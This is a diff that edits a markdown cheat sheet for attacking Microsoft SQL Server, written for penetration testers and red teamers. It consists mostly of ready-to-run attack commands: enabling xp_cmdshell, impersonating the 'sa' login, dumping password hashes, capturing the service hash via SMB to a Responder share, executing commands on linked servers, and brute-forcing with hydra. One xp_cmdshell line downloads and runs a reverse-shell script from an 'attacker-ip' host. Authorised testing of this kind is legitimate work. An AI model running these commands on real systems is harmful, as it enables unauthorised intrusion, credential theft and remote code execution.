@@ -1,6 +1,4 @@
-> Notes copied from [routezero.security](https://routezero.security/2025/03/29/mssql-cheat-sheet-for-penetration-testers/)
-
-Microsoft SQL Server (MSSQL) is a common target in penetration testing due to misconfigurations, weak credentials, and privilege escalation opportunities. This cheat sheet provides enumeration techniques, privilege escalation methods, and exploitation tactics useful for pentesters and red teamers.
+**Microsoft SQL Server** (MSSQL) is a common target in penetration testing due to misconfigurations, weak credentials, and privilege escalation opportunities. This cheat sheet provides enumeration techniques, privilege escalation methods, and exploitation tactics useful for pentesters and red teamers.
 
 ---
 
@@ -21,6 +19,7 @@ Connects to MSSQL using Impacket’s `mssqlclient.py`.
 python3 mssqlclient.py DOMAIN/user:password@target-ip
 ```
 
+> If you are targetting a local account, you can use `SERVERNAME\\accountname` or `.\\accountname`. 
 
 - **Using PowerShell (Windows)**
 Connects to MSSQL using Impacket’s `sqlcmd`.
@@ -100,6 +99,7 @@ EXEC xp_cmdshell 'whoami';
 ## 3. Credential Hunting & Privilege Escalation
 
 - **Enumerate local users**
+
 Retrives the machine local users using mssql.
 
 ```bash
@@ -107,6 +107,7 @@ nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
 ```
 
 - **User Impersonation**
+
 This command verifies whether the current user has permission to perform privilege escalation using the `mssql_priv` module of NetExec.
 
 ```bash
@@ -119,34 +120,42 @@ In the output, it will show us which user can be impersonated if impersonation i
 EXECUTE AS LOGIN = '<target_user>';
 ```
 
+This command impersonates the sysadmin user:
+```bash
+EXECUTE AS LOGIN = 'sa';SELECT SYSTEM_USER;SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+
 - **Finding Stored Credentials**
+
 Retrieves stored password hashes (if accessible).
 
-```
+```powershell
 SELECT name, password_hash FROM sys.sql_logins;
 ```
 
 
 - **Enabling** `xp_cmdshell` **for Command Execution**
+
 Enables `xp_cmdshell` to execute system commands.
 
-```
+```powershell
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
 
-
-- **Executing System Commands with** `xp_cmdshell`
 Runs system commands with MSSQL privileges.
 
-```
+```powershell
 EXEC xp_cmdshell 'whoami';
+# Executes a PowerShell-based reverse shell.
+EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
 ```
 
 - **Capturing MSSQL Service Hash**
+
 Force MSSQL to authenticate to attacker's SMB share
 
-```
+```powershell
 # Start Responder on attacker machine
 sudo responder -I eth0
 
@@ -158,43 +167,28 @@ EXEC xp_fileexist '\\attacker-ip\share\file';
 EXEC master..xp_subdirs '\\attacker-ip\share';
 ```
 
----
-
-## 4. Exploiting MSSQL for Lateral Movement
-
-- **Using MSSQL for Reverse Shell**
-Executes a PowerShell-based reverse shell.
-
-```
-EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
-```
-
 - **Abusing MSSQL Linked Servers**
+
+MSSQL supports **linked servers**, which allow one SQL Server instance to execute queries against another database server (SQL Server, Oracle, etc.).
+
 Lists linked servers (potential pivoting points).
 
 ```
 EXEC sp_linkedservers;
 ```
 
-
-- **Executing Commands on Linked Servers**
-Runs commands on a linked MSSQL server.
+Run commands on a linked MSSQL server:
 
 ```
 EXEC ('whoami') AT linked_server_name;
 ```
 
-- **Impersonate sysadmin user**
-This command impersonates the sysadmin user
-```
-EXECUTE AS LOGIN = 'sa';SELECT SYSTEM_USER;SELECT IS_SRVROLEMEMBER('sysadmin');
-```
-
 ---
 
-## 5. Brute-Forcing MSSQL Credentials
+## 4. Brute-Forcing MSSQL Credentials
 
 - **Using** `hydra`
+
 Attempts brute-force login.
 
 ```bash
